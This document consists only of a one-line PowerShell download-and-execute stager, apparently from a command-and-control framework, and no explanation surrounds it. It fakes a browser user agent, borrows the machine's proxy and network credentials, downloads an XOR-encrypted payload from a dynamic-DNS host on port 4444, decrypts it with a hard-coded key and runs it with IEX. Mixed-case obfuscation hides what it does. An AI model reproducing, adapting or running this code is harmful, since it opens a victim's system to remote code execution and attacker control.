
$Wc=NEW-ObjEct SYsTem.NeT.WebClIent;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$WC.HEAdErS.AdD('User-Agent',$u);$Wc.PrOxy = [SysTem.NeT.WeBREQueSt]::DefAULtWebProXy;$Wc.PRoXy.CredENTialS = [SYStem.Net.CrEdeNTIaLCaCHe]::DEFAUltNeTworkCreDeNTiAlS;$K='2bab33eb798937f2b3535936798024ce';$I=0;[CHAR[]]$B=([chAR[]]($wc.DOWnLOadSTRinG("http://ahyses.ddns.net:4444/index.asp")))|%{$_-bXor$k[$I++%$k.LeNGTh]};IEX ($b-jOiN'')

